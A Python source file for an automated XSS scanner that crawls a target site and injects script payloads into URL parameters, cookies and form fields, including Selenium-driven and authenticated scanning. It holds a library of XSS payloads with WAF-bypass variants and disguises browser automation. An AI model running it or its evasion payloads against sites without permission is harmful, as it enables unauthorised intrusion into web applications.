import re
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin, parse_qs
from js2xml import parse, utils
from .phishing_detector import PhishingDetector
from .report_generator import ReportGenerator
import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
from webdriver_manager.chrome import ChromeDriverManager

class XSSScanner:
    def __init__(self):
        self.visited_urls = set()
        self.vulnerable_urls = []
        self.phishing_detector = PhishingDetector()
        self.report_generator = ReportGenerator()
        self.timeout = 10  # Default timeout in seconds
        self.max_threads = 5  # Default number of threads
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
        self.payload_library = {
            'html_context': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<!--<img src="-->><script>alert(1)</script>'
            ],
            'attribute_context': [
                '" onmouseover=alert("XSS")',
                "'><svg/onload=alert('XSS')>",
                'javascript:alert(1)//'
            ],
            'javascript_context': [
                "'; alert('XSS');//",
                '\\\'; alert(1);//',
                '${alert("XSS")}'
            ],
            'waf_evasion': [
                '<script>alert("XSS")</script>'.encode('utf-16le').decode('latin-1'),
                '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#88;&#83;&#83;&#34;&#41;>',
                '<scr<script>ipt>alert("XSS")</scr</script>ipt>'
            ]
        }
        self.custom_payloads = []
        self.evasion_techniques = ['url_encode', 'html_entities', 'unicode_escape']
        self.use_selenium = False
        self.driver = None

    def initialize_selenium(self, headless=True):
        """Initialize Selenium WebDriver"""
        try:
            chrome_options = Options()
            if headless:
                chrome_options.add_argument("--headless")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument(f"user-agent={self.user_agent}")
            chrome_options.add_argument("--disable-notifications")
            chrome_options.add_argument("--disable-infobars")
            chrome_options.add_argument("--disable-extensions")
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
            self.driver.set_page_load_timeout(self.timeout)
            self.use_selenium = True
            return True
        except Exception as e:
            print(f"Error initializing Selenium: {str(e)}")
            self.use_selenium = False
            return False

    def close_selenium(self):
        """Close the Selenium WebDriver"""
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass
            finally:
                self.driver = None
                self.use_selenium = False

    def set_custom_payloads(self, payloads):
        """Set custom payloads for scanning"""
        if isinstance(payloads, list):
            self.custom_payloads = payloads
            return True
        return False
        
    def deep_scan(self, target_url, max_urls=10, log_queue=None, use_selenium=True):
        """Enhanced scanning with more payloads and deeper analysis"""
        self.visited_urls = set()
        self.vulnerable_urls = []
        
        # Initialize Selenium if requested
        if use_selenium:
            selenium_initialized = self.initialize_selenium()
            if log_queue:
                if selenium_initialized:
                    log_queue.put("Selenium initialized successfully")
                else:
                    log_queue.put("Failed to initialize Selenium, falling back to standard scanning")
        
        # Log the start of the deep scan
        if log_queue:
            log_queue.put(f"Starting deep scan on {target_url}")
            log_queue.put("Deep scan includes: WAF bypass attempts, DOM analysis, and custom payloads")
        
        # Use custom payloads if available
        all_payloads = []
        if self.custom_payloads:
            all_payloads.extend(self.custom_payloads)
            if log_queue:
                log_queue.put(f"Using {len(self.custom_payloads)} custom payloads")
        
        # Add all standard payloads
        for context, payloads in self.payload_library.items():
            all_payloads.extend(payloads)
        
        # Add evasion techniques
        evasion_payloads = []
        for payload in all_payloads:
            for technique in self.evasion_techniques:
                evasion_payloads.append(self.apply_evasion(payload, technique))
        
        all_payloads.extend(evasion_payloads)
        
        # Remove duplicates
        all_payloads = list(set(all_payloads))
        
        # Set up the temporary payload library for this scan
        orig_payload_library = self.payload_library.copy()
        for context in self.payload_library:
            self.payload_library[context] = all_payloads
        
        # Perform the scan
        result = self.scan_target(target_url, max_urls, log_queue)
        
        # Restore the original payload library
        self.payload_library = orig_payload_library
        
        # Close Selenium if it was used
        if self.use_selenium:
            self.close_selenium()
        
        return result

    def get_context_aware_payloads(self, context):
        if self.custom_payloads:
            return self.custom_payloads + self.payload_library.get(context, []) + self.payload_library['waf_evasion']
        return self.payload_library.get(context, []) + self.payload_library['waf_evasion']

    def apply_evasion(self, payload, technique):
        if technique == 'url_encode':
            return requests.utils.quote(payload)
        elif technique == 'html_entities':
            return ''.join(f'&#{ord(c)};' for c in payload)
        elif technique == 'unicode_escape':
            return payload.encode('unicode-escape').decode()
        return payload

    def analyze_dom(self, html_content):
        soup = BeautifulSoup(html_content, 'html.parser')
        scripts = soup.find_all('script')
        vulnerabilities = []
        
        for script in scripts:
            if script.string:
                try:
                    js_tree = parse(script.string)
                    dangerous_sinks = [
                        '//identifier[@name="document.write"]',
                        '//identifier[@name="innerHTML"]',
                        '//identifier[@name="eval"]'
                    ]
                    
                    for sink in dangerous_sinks:
                        nodes = js_tree.xpath(sink)
                        for node in nodes:
                            parent = utils.find_parent(node, 'call')
                            if parent:
                                arguments = parent.xpath('.//arguments//*')
                                for arg in arguments:
                                    if any(src in utils.get_path(arg) for src in ['location', 'document.URL', 'window.location']):
                                        vulnerabilities.append({
                                            'type': 'DOM-based XSS',
                                            'sink': node.get('name'),
                                            'code': script.string.strip()[:50] + '...'
                                        })
                except Exception as e:
                    continue
        return vulnerabilities

    def extract_forms(self, url, html_content):
        soup = BeautifulSoup(html_content, 'html.parser')
        return soup.find_all('form')

    def extract_form_details(self, form):
        details = {}
        action = form.get('action', '').lower()
        method = form.get('method', 'get').lower()
        inputs = []
        
        for input_tag in form.find_all('input'):
            input_type = input_tag.get('type', 'text')
            input_name = input_tag.get('name')
            if input_name:
                inputs.append({'type': input_type, 'name': input_name})
        
        details['action'] = action
        details['method'] = method
        details['inputs'] = inputs
        return details

    def is_vulnerable(self, response, payload):
        return payload in response.text

    def log_vulnerability(self, url, vector, payload, vuln_type='Standard'):
        self.vulnerable_urls.append({
            'url': url,
            'vector': vector,
            'payload': payload,
            'type': vuln_type
        })
        
        # Add report generation
        vuln_details = {
            'url': url,
            'vector': vector,
            'payload': payload,
            'type': vuln_type
        }
        self.report_generator.save_report(url, "xss", vuln_details)

    def scan_url(self, url, log_queue):
        if url in self.visited_urls:
            return
        
        self.visited_urls.add(url)
        log_queue.put(f"Scanning URL: {url}")
        
        try:
            # Setup headers with user agent
            headers = {'User-Agent': self.user_agent}
            
            # Make the request with timeout
            response = requests.get(url, headers=headers, timeout=self.timeout)
            
            # Phishing detection
            phishing_result = self.phishing_detector.analyze_url(url)
            log_queue.put(f"Phishing analysis: {phishing_result}")
            self.report_generator.save_report(url, "phishing", phishing_result)
            
            # DOM-based analysis
            dom_vulns = self.analyze_dom(response.text)
            for vuln in dom_vulns:
                log_queue.put(f"DOM-based XSS detected: {vuln['sink']}")
                self.vulnerable_urls.append({
                    'url': url,
                    'type': 'DOM-based',
                    'details': vuln
                })
                self.report_generator.save_report(url, "xss", vuln)

            # Parameter testing
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            for param in params:
                for payload in self.payload_library['waf_evasion']:
                    test_url = url.replace(f"{param}={params[param][0]}", f"{param}={payload}")
                    test_response = requests.get(test_url, headers=headers, timeout=self.timeout)
                    if self.is_vulnerable(test_response, payload):
                        self.log_vulnerability(url, f"URL parameter: {param}", payload, 'Parameter')

            # Cookie testing
            for cookie in response.cookies:
                for payload in self.payload_library['waf_evasion']:
                    malicious_cookie = {cookie.name: payload}
                    test_response = requests.get(url, headers=headers, cookies=malicious_cookie, timeout=self.timeout)
                    if self.is_vulnerable(test_response, payload):
                        self.log_vulnerability(url, f"Cookie: {cookie.name}", payload, 'Cookie')

            # Form testing
            forms = self.extract_forms(url, response.text)
            for form in forms:
                form_details = self.extract_form_details(form)
                log_queue.put(f"Testing form at {url} with action: {form_details['action']}")
                
                for payload in self.get_context_aware_payloads('html_context'):
                    data = {}
                    for input_tag in form_details['inputs']:
                        if input_tag['type'] != 'submit':
                            data[input_tag['name']] = payload
                    
                    if form_details['method'] == 'post':
                        response = requests.post(urljoin(url, form_details['action']), 
                                              data=data, 
                                              headers=headers, 
                                              timeout=self.timeout)
                    else:
                        response = requests.get(urljoin(url, form_details['action']), 
                                             params=data, 
                                             headers=headers,
                                             timeout=self.timeout)
                    
                    if self.is_vulnerable(response, payload):
                        self.log_vulnerability(url, f"Form action: {form_details['action']}", payload)

            # Use Selenium for dynamic content testing if enabled
            if self.use_selenium:
                self.scan_url_with_selenium(url, log_queue)

            # Extract URLs for crawling
            soup = BeautifulSoup(response.text, 'html.parser')
            domain = urlparse(url).netloc
            
            for a_tag in soup.find_all('a', href=True):
                href = a_tag['href']
                full_url = urljoin(url, href)
                if urlparse(full_url).netloc == domain and full_url not in self.visited_urls:
                    self.visited_urls.add(full_url)
                    log_queue.put(f"Added to queue: {full_url}")
                    
        except Exception as e:
            log_queue.put(f"Error scanning {url}: {str(e)}")

    def scan_target(self, target_url, max_urls=10, log_queue=None):
        self.visited_urls = set()
        self.vulnerable_urls = []
        
        parsed_url = urlparse(target_url)
        if not parsed_url.scheme:
            target_url = "http://" + target_url
        
        urls_to_scan = [target_url]
        
        while urls_to_scan and len(self.visited_urls) < max_urls:
            url = urls_to_scan.pop(0)
            if url not in self.visited_urls:
                self.scan_url(url, log_queue)
                
                try:
                    headers = {'User-Agent': self.user_agent}
                    response = requests.get(url, headers=headers, timeout=self.timeout)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    domain = urlparse(url).netloc
                    
                    for a_tag in soup.find_all('a', href=True):
                        href = a_tag['href']
                        full_url = urljoin(url, href)
                        if urlparse(full_url).netloc == domain and full_url not in self.visited_urls and full_url not in urls_to_scan:
                            urls_to_scan.append(full_url)
                except Exception as e:
                    if log_queue:
                        log_queue.put(f"Error extracting links from {url}: {str(e)}")
        
        return self.vulnerable_urls
    
    def scan_with_auth(self, target_url, username, password, max_urls=10, log_queue=None, use_selenium=True):
        """Perform a scan with authentication"""
        self.visited_urls = set()
        self.vulnerable_urls = []
        
        # Initialize Selenium for authenticated scanning if requested
        if use_selenium:
            selenium_initialized = self.initialize_selenium()
            if log_queue:
                if selenium_initialized:
                    log_queue.put("Selenium initialized successfully for authenticated scanning")
                else:
                    log_queue.put("Failed to initialize Selenium, falling back to standard authenticated scanning")
                    
        if log_queue:
            log_queue.put(f"Starting authenticated scan on {target_url}")
        
        parsed_url = urlparse(target_url)
        if not parsed_url.scheme:
            target_url = "http://" + target_url
            
        # Create a session for maintaining cookies
        session = requests.Session()
        headers = {'User-Agent': self.user_agent}
        
        # First attempt to authenticate with Selenium if available
        auth_successful = False
        if self.use_selenium and self.driver:
            try:
                if log_queue:
                    log_queue.put("Attempting to authenticate using Selenium...")
                
                # Navigate to the target URL
                self.driver.get(target_url)
                
                # Look for common login form elements
                login_inputs = False
                try:
                    # Wait for page to load and check for login fields
                    WebDriverWait(self.driver, 10).until(
                        EC.presence_of_element_located((By.TAG_NAME, "body"))
                    )
                    
                    # Look for username/email fields
                    username_fields = self.driver.find_elements(By.XPATH, 
                        "//input[@type='text' or @type='email' or contains(@name, 'user') or contains(@name, 'email') or contains(@id, 'user') or contains(@id, 'email')]")
                    
                    # Look for password fields
                    password_fields = self.driver.find_elements(By.XPATH, 
                        "//input[@type='password' or contains(@name, 'pass') or contains(@id, 'pass')]")
                    
                    # If we found both fields, try to login
                    if username_fields and password_fields:
                        login_inputs = True
                        username_fields[0].send_keys(username)
                        password_fields[0].send_keys(password)
                        
                        # Look for login buttons
                        login_buttons = self.driver.find_elements(By.XPATH, 
                            "//button[contains(@type, 'submit') or contains(text(), 'Login') or contains(text(), 'Sign in')] | "
                            "//input[@type='submit' or contains(@value, 'Login') or contains(@value, 'Sign in')]")
                        
                        if login_buttons:
                            login_buttons[0].click()
                        else:
                            # Try to submit the form directly
                            form = self.find_parent_form(password_fields[0])
                            if form:
                                try:
                                    form.submit()
                                except:
                                    pass
                        
                        # Wait for page to load after login
                        time.sleep(3)
                        
                        # Transfer cookies from Selenium to requests session
                        for cookie in self.driver.get_cookies():
                            session.cookies.set(cookie['name'], cookie['value'])
                        
                        auth_successful = True
                        if log_queue:
                            log_queue.put("Successfully authenticated with Selenium")
                    
                except Exception as e:
                    if log_queue:
                        log_queue.put(f"Error during Selenium authentication: {str(e)}")
                
                # If we didn't find login inputs, we might already be on an authenticated page
                if not login_inputs:
                    # Transfer cookies anyway in case we're already logged in
                    for cookie in self.driver.get_cookies():
                        session.cookies.set(cookie['name'], cookie['value'])
            
            except Exception as e:
                if log_queue:
                    log_queue.put(f"Selenium authentication failed: {str(e)}")
        
        # If Selenium auth failed or wasn't used, try standard form-based auth
        if not auth_successful:
            try:
                if log_queue:
                    log_queue.put("Attempting form-based authentication...")
                
                # Get the login page
                response = session.get(target_url, headers=headers, timeout=self.timeout)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find login forms
                forms = soup.find_all('form')
                login_form = None
                
                for form in forms:
                    # Look for password fields in the form
                    password_field = form.find('input', {'type': 'password'})
                    if password_field:
                        login_form = form
                        break
                
                if login_form:
                    # Get form details
                    form_details = self.extract_form_details(login_form)
                    
                    # Prepare login data
                    login_data = {}
                    for input_tag in form_details['inputs']:
                        input_name = input_tag.get('name')
                        if not input_name:
                            continue
                            
                        input_type = input_tag.get('type', 'text')
                        
                        # Find username and password fields
                        if input_type == 'password':
                            login_data[input_name] = password
                        elif input_type == 'text' or input_type == 'email':
                            login_data[input_name] = username
                        else:
                            # Use default values for other inputs
                            default_value = input_tag.get('value', '')
                            login_data[input_name] = default_value
                    
                    # Submit the login form
                    login_url = urljoin(target_url, form_details['action'])
                    if form_details['method'] == 'post':
                        response = session.post(login_url, data=login_data, headers=headers, timeout=self.timeout)
                    else:
                        response = session.get(login_url, params=login_data, headers=headers, timeout=self.timeout)
                    
                    auth_successful = True
                    if log_queue:
                        log_queue.put("Form-based authentication completed")
                else:
                    if log_queue:
                        log_queue.put("No login form found")
            
            except Exception as e:
                if log_queue:
                    log_queue.put(f"Form authentication error: {str(e)}")
        
        # Continue with scanning
        urls_to_scan = [target_url]
        
        while urls_to_scan and len(self.visited_urls) < max_urls:
            url = urls_to_scan.pop(0)
            if url not in self.visited_urls:
                self.visited_urls.add(url)
                if log_queue:
                    log_queue.put(f"Scanning authenticated URL: {url}")
                
                # First scan with Selenium if available
                if self.use_selenium and self.driver:
                    try:
                        # Navigate to the URL with our authenticated session
                        self.driver.get(url)
                        
                        # Wait for the page to load
                        WebDriverWait(self.driver, 10).until(
                            EC.presence_of_element_located((By.TAG_NAME, "body"))
                        )
                        
                        # Perform Selenium-based tests
                        self.scan_url_with_selenium(url, log_queue)
                        
                    except Exception as e:
                        if log_queue:
                            log_queue.put(f"Selenium error on authenticated page {url}: {str(e)}")
                
                try:
                    response = session.get(url, headers=headers, timeout=self.timeout)
                    
                    # Phishing detection
                    phishing_result = self.phishing_detector.analyze_url(url)
                    if log_queue:
                        log_queue.put(f"Phishing analysis: {phishing_result}")
                    self.report_generator.save_report(url, "phishing", phishing_result)
                    
                    # DOM-based analysis
                    dom_vulns = self.analyze_dom(response.text)
                    for vuln in dom_vulns:
                        if log_queue:
                            log_queue.put(f"DOM-based XSS detected: {vuln['sink']}")
                        self.vulnerable_urls.append({
                            'url': url,
                            'type': 'DOM-based',
                            'details': vuln
                        })
                        self.report_generator.save_report(url, "xss", vuln)
            
                    # Testing forms with our authenticated session
                    forms = self.extract_forms(url, response.text)
                    for form in forms:
                        form_details = self.extract_form_details(form)
                        if log_queue:
                            log_queue.put(f"Testing form at {url} with action: {form_details['action']}")
                        
                        for payload in self.get_context_aware_payloads('html_context'):
                            data = {}
                            for input_tag in form_details['inputs']:
                                if input_tag['type'] != 'submit':
                                    data[input_tag['name']] = payload
                            
                            form_url = urljoin(url, form_details['action'])
                            if form_details['method'] == 'post':
                                test_response = session.post(form_url, data=data, headers=headers, timeout=self.timeout)
                            else:
                                test_response = session.get(form_url, params=data, headers=headers, timeout=self.timeout)
                            
                            if self.is_vulnerable(test_response, payload):
                                self.log_vulnerability(url, f"Form action: {form_details['action']}", payload)
            
                    # Crawl links
                    soup = BeautifulSoup(response.text, 'html.parser')
                    domain = urlparse(url).netloc
                    
                    for a_tag in soup.find_all('a', href=True):
                        href = a_tag['href']
                        full_url = urljoin(url, href)
                        if urlparse(full_url).netloc == domain and full_url not in self.visited_urls and full_url not in urls_to_scan:
                            urls_to_scan.append(full_url)
                            
                except Exception as e:
                    if log_queue:
                        log_queue.put(f"Error scanning {url}: {str(e)}")
        
        # Close Selenium if it was used
        if self.use_selenium:
            self.close_selenium()
            
        return self.vulnerable_urls

    def scan_url_with_selenium(self, url, log_queue=None):
        """Scan a URL using Selenium for dynamic content testing"""
        if not self.driver:
            if log_queue:
                log_queue.put("Selenium not initialized, skipping dynamic scan")
            return False
        
        if log_queue:
            log_queue.put(f"Scanning with Selenium: {url}")
        
        try:
            # Open the URL in the browser
            self.driver.get(url)
            
            # Wait for the page to load
            WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            
            # Detect and test input fields
            input_fields = self.driver.find_elements(By.TAG_NAME, "input")
            textareas = self.driver.find_elements(By.TAG_NAME, "textarea")
            
            all_inputs = input_fields + textareas
            if log_queue:
                log_queue.put(f"Found {len(all_inputs)} input elements to test")
            
            for i, input_elem in enumerate(all_inputs):
                try:
                    input_type = input_elem.get_attribute("type")
                    input_name = input_elem.get_attribute("name") or f"unnamed-input-{i}"
                    
                    # Skip hidden or non-text inputs
                    if input_type in ["hidden", "submit", "button", "image", "file"]:
                        continue
                    
                    # Test different XSS payloads
                    for payload in self.get_context_aware_payloads('html_context'):
                        # Create a new driver instance for each test to avoid alerts
                        try:
                            self.driver.get(url)
                            WebDriverWait(self.driver, 10).until(
                                EC.presence_of_element_located((By.TAG_NAME, "body"))
                            )
                            
                            # Find the same input again (since we refreshed the page)
                            input_elements = self.driver.find_elements(By.TAG_NAME, "input") + self.driver.find_elements(By.TAG_NAME, "textarea")
                            if i < len(input_elements):
                                current_input = input_elements[i]
                                
                                # Clear and fill the input
                                current_input.clear()
                                current_input.send_keys(payload)
                                
                                # Find and submit the form
                                form = self.find_parent_form(current_input)
                                if form:
                                    submit_buttons = form.find_elements(By.XPATH, ".//input[@type='submit'] | .//button[@type='submit'] | .//button[not(@type)]")
                                    if submit_buttons:
                                        submit_buttons[0].click()
                                    else:
                                        # Try to submit the form directly
                                        try:
                                            form.submit()
                                        except:
                                            pass
                                
                                # Wait for any alert
                                try:
                                    WebDriverWait(self.driver, 3).until(EC.alert_is_present())
                                    alert = self.driver.switch_to.alert
                                    alert_text = alert.text
                                    alert.accept()
                                    
                                    # Log vulnerability
                                    vuln_details = {
                                        'url': url,
                                        'vector': f"Input field: {input_name}",
                                        'payload': payload,
                                        'type': 'Reflected XSS (Selenium)',
                                        'details': f"Alert triggered with text: {alert_text}"
                                    }
                                    self.vulnerable_urls.append(vuln_details)
                                    self.report_generator.save_report(url, "xss", vuln_details)
                                    
                                    if log_queue:
                                        log_queue.put(f"XSS vulnerability found! Input: {input_name}, Payload: {payload}")
                                    
                                except TimeoutException:
                                    # No alert was triggered
                                    pass
                        
                        except Exception as e:
                            if log_queue:
                                log_queue.put(f"Error testing input {input_name}: {str(e)}")
                
                except Exception as e:
                    if log_queue:
                        log_queue.put(f"Error processing input element: {str(e)}")
            
            # Test for DOM-based XSS by injecting JavaScript events
            self.test_dom_events(url, log_queue)
            
            return True
            
        except Exception as e:
            if log_queue:
                log_queue.put(f"Selenium error scanning {url}: {str(e)}")
            return False

    def find_parent_form(self, element):
        """Find the parent form of an element using Selenium"""
        try:
            return element.find_element(By.XPATH, "./ancestor::form")
        except:
            return None

    def test_dom_events(self, url, log_queue=None):
        """Test DOM events for potential XSS vulnerabilities"""
        try:
            event_handlers = [
                "onclick", "onmouseover", "onmouseout", "onkeydown", "onload", 
                "onerror", "onfocus", "onblur"
            ]
            
            # Get all elements with event handlers
            elements_with_events = []
            for event in event_handlers:
                elements = self.driver.find_elements(By.XPATH, f"//*[@{event}]")
                for elem in elements:
                    elements_with_events.append((elem, event, elem.get_attribute(event)))
            
            if log_queue:
                log_queue.put(f"Found {len(elements_with_events)} elements with event handlers")
            
            # Test for URL parameters reflected in event handlers
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            
            if params:
                # Check if any parameter is reflected in event handlers
                for param_name, param_value in params.items():
                    value = param_value[0] if param_value else ""
                    for elem, event, handler in elements_with_events:
                        if value and value in handler:
                            vuln_details = {
                                'url': url,
                                'vector': f"DOM event handler: {event}",
                                'payload': value,
                                'type': 'DOM-based XSS (Event Handler)',
                                'details': f"Parameter {param_name} reflected in {event} handler"
                            }
                            self.vulnerable_urls.append(vuln_details)
                            self.report_generator.save_report(url, "xss", vuln_details)
                            
                            if log_queue:
                                log_queue.put(f"DOM-based XSS vulnerability found! Parameter: {param_name}, Event: {event}")
            
            # Test for dynamic content loading
            scripts = self.driver.find_elements(By.TAG_NAME, "script")
            for script in scripts:
                script_content = script.get_attribute("innerHTML")
                if script_content:
                    dangerous_patterns = [
                        "document.write", "innerHTML", "eval(", 
                        "setTimeout(", "setInterval(", "Function("
                    ]
                    for pattern in dangerous_patterns:
                        if pattern in script_content:
                            line_number = script_content.count('\n', 0, script_content.find(pattern)) + 1
                            vuln_details = {
                                'url': url,
                                'vector': f"Script tag with {pattern}",
                                'type': 'Potential DOM-based XSS',
                                'details': f"Found potentially unsafe {pattern} at line {line_number}"
                            }
                            self.report_generator.save_report(url, "xss_potential", vuln_details)
                            
                            if log_queue:
                                log_queue.put(f"Potential DOM-based XSS: {pattern} found in script")
            
        except Exception as e:
            if log_queue:
                log_queue.put(f"Error testing DOM events: {str(e)}")